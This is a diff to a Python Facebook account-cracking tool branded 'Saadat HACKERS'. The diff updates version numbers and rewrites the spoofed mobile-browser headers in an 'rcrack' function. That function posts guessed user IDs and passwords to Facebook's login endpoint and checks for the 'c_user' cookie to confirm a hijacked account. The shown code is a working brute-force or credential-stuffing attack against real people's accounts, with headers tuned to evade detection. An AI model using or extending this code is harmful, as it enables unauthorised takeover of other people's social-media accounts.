@@ -178,7 +178,7 @@ logo =                                          f"""{H}
 \033[1;31m\033[1;32m\033[1;32mFACEBOOK \033[1;31m\033[1;32m Raziqullah Saadat\033[1;31m 
 \033[1;31m\033[1;32m \033[1;32mGITHUB \033[1;31m \033[1;32m Arman\033[1;31m 
 \033[1;31m\033[1;32m\033[1;32mWHATSAPP \033[1;31m\033[1;32m +93702856593 \033[1;31m 
-\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 0.02\033[1;31m 
+\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 10.00\033[1;31m 
 \033[1;37mMESSENGER GROUP Saadat HACKERS{ M }\033[1;37m 
 \033[1;92m==========================================================
 \033[33;44m NAME Raziqullah Saadat \033[0;m
@@ -203,9 +203,9 @@ else:
     
 try:
     print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
-    v = 0.2
-    update = ('0.2')
-    update = ('0.2')
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
     if str(v) in update:
         os.system('clear')
     else:pass
@@ -308,22 +308,19 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'x.facebook.com',
-           'method': 'GET',
-           'scheme': 'https',
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-           'accept-language': 'en-US,en;q=0.9',
-           'cache-control': 'max-age=0',
-           'sec-ch-prefers-color-scheme': 'light',
-           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-           'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-           'sec-ch-ua-mobile': '?1',
-           'sec-ch-ua-platform': '"Android"',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'none',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'referer': 'https://x.facebook.com/',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
             lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
